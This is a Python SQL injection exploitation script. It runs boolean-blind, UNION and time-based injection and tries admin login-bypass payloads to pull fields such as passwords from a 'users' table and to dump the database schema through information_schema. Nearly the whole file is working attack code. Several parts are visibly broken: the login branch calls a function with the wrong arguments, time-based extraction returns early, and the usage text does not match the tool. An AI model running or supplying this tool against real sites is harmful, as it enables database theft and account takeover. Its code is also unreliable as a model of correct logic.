import argparse
import base64
import requests
import string
import sys
import time

CONF = { 'get_data': '', 'post_data': '', 'cookies': {}, 'headers': {},
        'sep_col': '', 'sep_line': '', 'table': '', 'column': '', 'delay_request': 0, 'success': None, 'error': None }

CONF['headers']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"


def build_payload(payload):

    get_data = CONF['get_data'].replace('^SQLI^', payload)
    post_data = CONF['post_data'].replace('^SQLI^', payload)
    
    cookies = {}
    for k, v in CONF['cookies'].items():
        cookies[k] = v.replace('^SQLI^', payload)

    headers = {}
    for k, v in CONF['headers'].items():
        headers[k] = v.replace('^SQLI^', payload)

    return get_data, post_data, cookies, headers


def check_url(url, payload):

    time.sleep(CONF['delay_request'])
    get_data, post_data, cookies, headers = build_payload(payload)

    if CONF['method'] == 'POST':
        headers['Content-Type'] = "application/x-www-form-urlencoded"
        headers['Content-Length'] = str(len(post_data))

        res = requests.post(url + '?' + get_data, data=post_data, cookies=cookies, headers=headers)
    else:
        res = requests.get(url + '?' + get_data, cookies=cookies, headers=headers)
    
    #print(get_data, post_data, cookies, headers)
    #print(res.text)

    return res


def check_result(result):
    check = True

    if CONF['success'] is not None and CONF['success'] not in result.text:
        check = False

    if CONF['error'] is not None and CONF['error'] in result.text:
        check = False

    return check


def blind_extract(url, val, data_length=20, charset=string.printable):
    data_found = ''

    for idx in range(1, data_length + 1):

        for char in charset:

            payload = f"{val}{CONF['breaker']} AND BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}'-- -"
            result = check_url(url, payload)
            check = check_result(result)

            print(f"\r[+] Found : {data_found + char}", end='')
            
            if check:
                data_found += char
                break

    print("")
    return data_found


def blind_data_length(url, val):
    data_length = 0

    while True:
        payload = f"{val}{CONF['breaker']} AND length({CONF['column']}) >= {data_length + 1}-- -"
        #print(payload)
        result = check_url(url, payload)
        check = check_result(result)

        if check:
            data_length += 1
        else:
            break

    return data_length


def union_nb_columns(url, val):
    nb_columns = 0

    while True:
        result = check_url(url, f"{val}{CONF['breaker']} ORDER BY {nb_columns+1}-- -")
        check = check_result(result)

        if check:
            nb_columns += 1
        else:
            break

    return nb_columns


def union_readable_column(url, nb_columns, val):

    tab_readable = []
    tab_placeholder = [str(x) * 10 for x in range(nb_columns)]
    fields = ','.join(tab_placeholder)

    #result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields}-- -")
    
    for x in range(len(tab_placeholder)):
        if tab_placeholder[x] in result.text:
            tab_readable.append(x)

    if len(tab_readable) > 0:
        return tab_readable[0]

    return -1


def union_extract(url, nb_columns, val, idx_column=0, limit_start=0, limit_count=500):
    data_found = ''

    column = CONF['column'].split(',')
    sep_line = CONF['sep_line'].encode().hex()
    sep_col = CONF['sep_col'].encode().hex()

    column = f"CONCAT(0x{sep_line},{(',0x'+sep_col+',').join(column)},0x{sep_line})"
    fields = ('1,' * idx_column) + column + (',1' * (nb_columns-1-idx_column))

    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT {limit_start}, {limit_count}-- -")
    check = check_result(result)

    tab_final = []

    if check or CONF['sep_col'] in result.text:
        tab_lines = result.text.split(CONF['sep_line'])
        tab_lines = tab_lines[1:-1:2]

        for line in tab_lines:
            tab_cols = line.split(CONF['sep_col'])
            tab_final.append(tab_cols)

    return tab_final


def time_extract(url, val, data_length=20, charset=string.printable):
    data_found = ''

    for idx in range(1, data_length + 1):
        for char in charset:

            start_time = time.time()

            payload = f"{val}{CONF['breaker']} AND IF (BINARY SUBSTRING({CONF['column']}, {idx}, 1) = '{char}', sleep({CONF['time_delay']}), 'false')-- -"
            result = check_url(url, payload)
            #check = check_result(result)

            if (time.time() - start_time) >= CONF['time_delay']:
                data_found += char
                return data_length

    return data_found



def time_data_length(url, val):
    data_length = 0

    while True:

        start_time = time.time()

        payload = f"{val}{CONF['breaker']} AND IF (length({CONF['column']}) = {data_length}, sleep({CONF['time_delay']}), 'false')-- -"
        result = check_url(url, payload)
        #check = check_result(result)

        if (time.time() - start_time) >= CONF['time_delay']:
            return data_length


    #payload = "1' AND (SELECT 8889 FROM (SELECT(SLEEP(5)))HhUy) AND 'lDLY'='lDLY"


def msg_usage(name=None):
    return f'''
Basic : 
    {name} -c 18 -a 10 -n 1
Specify performance settings : 
    {name} -c 18 -a 10 -n 1 -p 10 -d 9.6 -s 128
Repeater stuff :
    {name} -c 18 -a 10 -n 1 -x client
'''


print()
parser = argparse.ArgumentParser(description='HTTP POST bruteforcer')
parser.add_argument('-u', '--url', metavar='', required=True, help='URL to bruteforce')
parser.add_argument('-m', '--method', metavar='', default='POST', choices=['GET','POST'], help='HTTP method to use')

group1 = parser.add_argument_group('Request parameters')
group1.add_argument('-x', '--headers', metavar='', action='append', help='Additionnal headers, format HEADER=VALUE Use ^SQLI^ as placeholder')
group1.add_argument('-c', '--cookies', metavar='', action='append', help='Cookies. Standard format : NAME=VALUE Use ^SQLI^ as placeholder')
group1.add_argument('-p', '--post-data', metavar='', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
group1.add_argument('-g', '--get-data', metavar='', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')

group2 = parser.add_argument_group('SQLi options')
group2.add_argument('-f', '--field', metavar='', default='password', help='Field(s) to extract, (password or username,password)')
group2.add_argument('-t', '--table', metavar='', default='users', help='Table to extract from')
group2.add_argument('-a', '--action', metavar='', default='', choices=['blind','union','login','time'], help='Type of injection to execute')
group2.add_argument('-v', '--value', metavar='', default='', help='Valid value used to check if SQLi is working')
group2.add_argument('-debug', '--debug', default=False, action='store_true', help='')
group2.add_argument('-d', '--dump-schema', default=False, action='store_true', help='Dump database schema')

group3_container = parser.add_argument_group('Result detection')
group3 = group3_container.add_mutually_exclusive_group(required=True)
group3.add_argument('-s', '--success', metavar='', help='Success string to look for')
group3.add_argument('-e', '--error', metavar='', help='Error string to look for')
#args = parser.parse_args()
args, leftovers = parser.parse_known_args()


CONF['breaker'] = "'"
CONF['bad_value'] = '-1'
CONF['sep_col'] = '|||'
CONF['sep_line'] = '%%%'
CONF['delay_request'] = 0.05
CONF['time_delay'] = 2

CONF['column'] = args.field
CONF['table'] = args.table
CONF['value'] = args.value
CONF['success'] = args.success
CONF['error'] = args.error

CONF['method'] = args.method.upper()
CONF['get_data'] = args.get_data
CONF['post_data'] = args.post_data

list_bypass = ["admin"+ CONF['breaker'] +"-- -", "admin"+ CONF['breaker'] +" and 1=1-- -", "admin"+ CONF['breaker'] +" or 1=1 limit 1"]

if args.cookies:
    for c in args.cookies:
        idx = c.find('=')
        if idx > -1:
            CONF['cookies'][c[0:idx].strip()] = c[idx+1:].strip()

if args.headers:
    for h in args.headers:
        idx = h.find('=')
        if idx > -1:
            CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()


if args.dump_schema:
    CONF['column'] = "table_name,column_name"
    CONF['table'] = "information_schema.columns where table_schema=database()"

url = args.url
print("[+] URL :", url)
print("[+] CONF :", CONF)


if args.action == 'login':

    for bypass in list_bypass:
        result = check_url(url, bypass, '')
        check = check_result(result)

        if check:
            print("Bypass works with payload", bypass)

elif args.action == 'blind':
    data_length = blind_data_length(url, CONF['value'])
    print("Found length :", data_length)
    data_found = blind_extract(url, CONF['value'], data_length)
    print("Found data :", data_found)

elif args.action == 'union':
    nb_columns = union_nb_columns(url, CONF['value'])
    print("Found nb columns :", nb_columns)
    idx_column = union_readable_column(url, nb_columns, CONF['bad_value'])
    print("Found readable column :", idx_column+1)
    data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column)
    print("Found data :", data_found)

    if len(data_found) == 1:
        x = 1
        while len(data_found) > 0:
            data_found = union_extract(url, nb_columns, CONF['bad_value'], idx_column, limit_start=x, limit_count=1)
            x += 1
            print(data_found)


elif args.action == 'time':
    data_length = time_data_length(url, CONF['value'])
    print("Found length :", data_length)
    data_found = time_extract(url,data_length, CONF['value'])
    print("Found data :", data_found)


print("That's all then")
